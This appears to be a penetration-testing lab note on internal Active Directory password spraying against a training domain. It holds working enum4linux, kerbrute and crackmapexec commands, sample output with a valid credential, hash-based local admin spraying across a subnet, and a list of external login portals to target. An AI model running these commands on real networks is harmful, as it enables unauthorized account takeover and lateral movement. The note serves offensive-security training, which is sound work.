# Internal Password Spraying

This is a crucial concept to master because it allows us to gain inital domain access. However, it must be approached with caution.

## Linux

### Kerbrute:

Initially, we can <mark style="color:yellow;">obtain valid users</mark> via <mark style="color:yellow;">Enum4Linux</mark> and place the output in a file called users.txt:

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" >> users.txt
```

Now, we can <mark style="color:yellow;">passwordspray</mark> with <mark style="color:yellow;">Kerbrute</mark>:

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

### Using CrackMapExec and Filtering Logon Failures

```
sudo crackmapexec smb 172.16.5.5 -u users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

We can then use CME to validate these credentials quickly:

```
sudo crackmapexec 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Local Admin Spraying with CrackMapExec

* <mark style="color:yellow;">There may be a case where you have obtained the NTLM hash for the local administrator from the local SAM database</mark>
* <mark style="color:yellow;">In this case, you can use this hash to spray against the whole subnet to hunt for administrator accounts with the same password set</mark>

```
sudo crackmapexec --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows

### Using DomainPasswordSpray.ps1

{% embed url="https://github.com/dafthack/DomainPasswordSpray" %}

* <mark style="color:yellow;">This tool is extremely COOL</mark>

External Password Spraying

While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:

* Microsoft 0365
* Outlook Web Exchange
* Exchange Web Access
* Skype for Business
* Lync Server
* Microsoft Remote Desktop Services (RDS) Portals
* Citrix portals using AD authentication
* VDI implementations using AD authentication such as VMware Horizon
* VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
* Custom web applications that use AD authentication
